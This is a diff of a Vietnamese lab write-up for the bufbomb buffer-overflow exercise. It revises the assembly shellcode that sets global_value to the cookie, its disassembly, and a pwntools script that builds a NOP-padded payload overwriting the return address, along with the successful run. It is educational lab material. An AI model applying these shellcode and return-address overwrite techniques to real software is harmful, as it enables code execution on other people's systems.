@@ -32,11 +32,10 @@ Và cả địa chỉ của biến `cookie`.
 
 Vậy shellcode của chúng ta như sau:  
 ```asm
-movl $0x8013F160,%eax
-movl $0x8013F158,%ebx
-movl (%ebx),%ebx
-movl %ebx,(%eax)
-push $0x80139b69
+movl $0x8013F158,%eax
+movl (%eax),%eax
+movl $0x8013F160,%ebx
+movl %eax,(%ebx)
 push $0x80139b69
 ret
 ```  
@@ -55,13 +54,12 @@ shellcode.o:     file format elf32-i386
 Disassembly of section .text:
 
 00000000 <.text>:
-   0:   b8 60 f1 13 80          mov    $0x8013f160,%eax
-   5:   bb 58 f1 13 80          mov    $0x8013f158,%ebx
-   a:   8b 1b                   mov    (%ebx),%ebx
-   c:   89 18                   mov    %ebx,(%eax)
+   0:   b8 58 f1 13 80          mov    $0x8013f158,%eax
+   5:   8b 00                   mov    (%eax),%eax
+   7:   bb 60 f1 13 80          mov    $0x8013f160,%ebx
+   c:   89 03                   mov    %eax,(%ebx)
    e:   68 69 9b 13 80          push   $0x80139b69
-  13:   68 69 9b 13 80          push   $0x80139b69
-  18:   c3                      ret
+  13:   c3                      ret
 ```
 
 Tiếp theo, chúng ta sẽ tìm địa chỉ để ghi đè vào `return address`.  
@@ -81,15 +79,10 @@ from pwn import *
 
 context.binary = './bufbomb'
 
-# tạo 1 process cho chương trình bufbomb
 io = process(['./bufbomb', '-u', '09821978'])
 
-# tạo shellcode
-shellcode = b'\xb8\x60\xf1\x13\x80\xbb\x58\xf1\x13\x80\x8b\x1b\x89\x18\x68\x69\x9b\x13\x80\x68\x69\x9b\x13\x80\xc3'
-# tạo exploit_payload
-# \x90 là byte biểu diễn cho lệnh nop (no operation)
+shellcode = b'\xb8\x58\xf1\x13\x80\x8b\x00\xbb\x60\xf1\x13\x80\x89\x03\x68\x69\x9b\x13\x80\xc3'
 exploit_payload = shellcode + b'\x90' * (0x28 + 0x4 - len(shellcode))
-# chèn địa chỉ của shellcode vào payload để ghi đè return address
 exploit_payload += p32(0x55683cf8)
 
 print(f"{exploit_payload = }")
@@ -107,10 +100,10 @@ Chạy script.
     Stack:    Canary found
     NX:       NX enabled
     PIE:      No PIE (0x8048000)
-[+] Starting local process './bufbomb': pid 365
-exploit_payload = b'\xb8`\xf1\x13\x80\xbbX\xf1\x13\x80\x8b\x1b\x89\x18hi\x9b\x13\x80hi\x9b\x13\x80\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xf8<hU'
+[+] Starting local process './bufbomb': pid 391
+exploit_payload = b'\xb8X\xf1\x13\x80\x8b\x00\xbb`\xf1\x13\x80\x89\x03hi\x9b\x13\x80\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xf8<hU'
 [*] Switching to interactive mode
-[*] Process './bufbomb' stopped with exit code 0 (pid 365)
+[*] Process './bufbomb' stopped with exit code 0 (pid 391)
 Userid: 09821978
 Cookie: 0x31f21393
 Type string:Bang!: You set global_value to 0x31f21393
